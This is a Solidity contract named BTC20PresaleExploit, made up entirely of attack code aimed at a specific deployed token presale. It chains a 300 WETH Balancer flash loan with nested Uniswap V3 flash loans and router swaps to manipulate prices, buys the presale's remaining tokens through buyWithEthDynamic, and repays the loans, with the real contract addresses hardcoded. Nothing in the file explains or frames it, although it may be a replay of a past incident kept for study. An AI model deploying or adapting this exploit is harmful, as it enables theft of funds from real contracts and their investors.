// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IUniswapV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IUniswapV3Router {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(
        ExactInputSingleParams memory params
    ) external payable returns (uint256 amountOut);
}

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IPresaleV4 {
    function directTotalTokensSold() external view returns (uint256);
    function maxTokensToSell() external view returns (uint256);
    function buyWithEthDynamic(uint256 amount) external payable returns (bool);
}

contract BTC20PresaleExploit {
    address private constant BTC20_ADDR = 0xE86DF1970055e9CaEe93Dae9B7D5fD71595d0e18;
    address private constant SDEX_ADDR = 0x5DE8ab7E27f6E7A1fFf3E5B337584Aa43961BEeF;
    address private constant WETH_ADDR = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant BALANCER_ADDR = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address private constant SDEX_BTC20_PAIR3_ADDR = 0xDb81b8cfB2718f7289ae2365DE800ac2c787E385;
    address private constant BTC20_WETH_PAIR3_ADDR = 0x7234c91bd835a6Ed108c8e986E0663B14F9DE14e;
    address private constant UNI_V3_ROUTER_ADDR = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address private constant UNI_V2_ROUTER_ADDR = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant PRESALE_V4_ADDR = 0x1F006F43f57C45Ceb3659E543352b4FAe4662dF7;

    IERC20 private constant BTC20 = IERC20(BTC20_ADDR);
    IERC20 private constant SDEX = IERC20(SDEX_ADDR);
    IERC20 private constant WETH = IERC20(WETH_ADDR);
    IBalancerVault private constant BALANCER = IBalancerVault(BALANCER_ADDR);
    IUniswapV3Pool private constant SDEX_BTC20_PAIR3 = IUniswapV3Pool(SDEX_BTC20_PAIR3_ADDR);
    IUniswapV3Pool private constant BTC20_WETH_PAIR3 = IUniswapV3Pool(BTC20_WETH_PAIR3_ADDR);
    IUniswapV3Router private constant UNI_V3_ROUTER = IUniswapV3Router(UNI_V3_ROUTER_ADDR);
    IUniswapV2Router private constant UNI_V2_ROUTER = IUniswapV2Router(UNI_V2_ROUTER_ADDR);
    IPresaleV4 private constant PRESALE_V4 = IPresaleV4(PRESALE_V4_ADDR);

    uint256 private constant AMOUNT_SDEX_BTC20_PAIR3 = 76_301_042_059_171_907_852_637;
    uint256 private constant AMOUNT_BTC20_WETH_PAIR3 = 47_676_018_750_296_374_476_872;
    uint256 private constant TOTAL_BORROWED = 300 ether;

    address[] private addrPath = new address[](2);

    constructor() payable {
        approveAll();
    }

    function run() external {
        address[] memory tokens = new address[](1);
        tokens[0] = WETH_ADDR;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = TOTAL_BORROWED;
        BALANCER.flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external {
        exploitBTC();
        IERC20(tokens[0]).transfer(msg.sender, amounts[0] + feeAmounts[0]);
    }

    function exploitBTC() internal {
        SDEX_BTC20_PAIR3.flash(address(this), 0, AMOUNT_SDEX_BTC20_PAIR3, abi.encode(AMOUNT_SDEX_BTC20_PAIR3));

        (addrPath[0], addrPath[1]) = (BTC20_ADDR, WETH_ADDR);
        IUniswapV3Router.ExactInputSingleParams memory params = IUniswapV3Router.ExactInputSingleParams({
            tokenIn: BTC20_ADDR,
            tokenOut: SDEX_ADDR,
            fee: 10_000,
            recipient: address(this),
            deadline: type(uint256).max,
            amountIn: BTC20.balanceOf(address(this)),
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        UNI_V3_ROUTER.exactInputSingle(params);
        (params.tokenIn, params.tokenOut, params.amountIn) = (SDEX_ADDR, WETH_ADDR, SDEX.balanceOf(address(this)));
        UNI_V3_ROUTER.exactInputSingle(params);
    }

    function uniswapV3FlashCallback(uint256, uint256, bytes calldata data) external {
        uint256 amount = abi.decode(data, (uint256));

        if (amount == AMOUNT_SDEX_BTC20_PAIR3) {
            BTC20_WETH_PAIR3.flash(address(this), 0, AMOUNT_BTC20_WETH_PAIR3, abi.encode(AMOUNT_BTC20_WETH_PAIR3));
            (uint256 amountOut, uint256 amountInMax) = (amount + amount / 100 + 1, WETH.balanceOf(address(this)));
            (addrPath[0], addrPath[1]) = (WETH_ADDR, BTC20_ADDR);
            UNI_V2_ROUTER.swapTokensForExactTokens(amountOut, amountInMax, addrPath, address(this), type(uint256).max);
            BTC20.transfer(SDEX_BTC20_PAIR3_ADDR, amountOut);
        } else if (amount == AMOUNT_BTC20_WETH_PAIR3) {
            uint256 amountIn = BTC20.balanceOf(address(this));
            (addrPath[0], addrPath[1]) = (BTC20_ADDR, WETH_ADDR);
            UNI_V2_ROUTER.swapExactTokensForTokens(amountIn, 0, addrPath, address(this), type(uint256).max);
            uint256 buyAmount = PRESALE_V4.maxTokensToSell() - PRESALE_V4.directTotalTokensSold();
            PRESALE_V4.buyWithEthDynamic{value: TOTAL_BORROWED}(buyAmount);
            (uint256 amountOut, uint256 amountInMax) = (amount + amount / 100 + 1, WETH.balanceOf(address(this)));
            (addrPath[0], addrPath[1]) = (WETH_ADDR, BTC20_ADDR);
            UNI_V2_ROUTER.swapTokensForExactTokens(amountOut, amountInMax, addrPath, address(this), type(uint256).max);
            BTC20.transfer(BTC20_WETH_PAIR3_ADDR, amountOut);
        }
    }

    function approveAll() internal {
        SDEX.approve(SDEX_BTC20_PAIR3_ADDR, type(uint256).max);
        SDEX.approve(UNI_V3_ROUTER_ADDR, type(uint256).max);
        BTC20.approve(SDEX_BTC20_PAIR3_ADDR, type(uint256).max);
        BTC20.approve(BTC20_WETH_PAIR3_ADDR, type(uint256).max);
        BTC20.approve(UNI_V2_ROUTER_ADDR, type(uint256).max);
        BTC20.approve(UNI_V3_ROUTER_ADDR, type(uint256).max);
        WETH.approve(UNI_V2_ROUTER_ADDR, type(uint256).max);
        BTC20.approve(PRESALE_V4_ADDR, type(uint256).max);
        WETH.approve(PRESALE_V4_ADDR, type(uint256).max);
    }

    receive() external payable {}
}
